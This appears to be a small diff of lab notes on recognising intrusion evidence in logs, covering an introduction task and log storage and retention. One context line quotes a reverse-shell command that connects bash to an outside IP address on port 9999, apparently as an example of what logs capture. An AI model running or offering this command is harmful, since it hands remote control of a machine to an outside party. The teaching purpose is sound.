@@ -43,8 +43,10 @@ Ref:
 
 
 ---
+
 Task 1 - Introduction
 ---
+
 How can we identify malicious activities? What kind of evidence is generated when an intruder breaches a network? Why is it essential to recognise these indicators within our environment?
 
 
@@ -394,8 +396,10 @@ bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1"
 
 
 ---
+
 Task 5 - Storage, Retention, and Deletion
 ---
+
 
 ### Log Storage
 ---
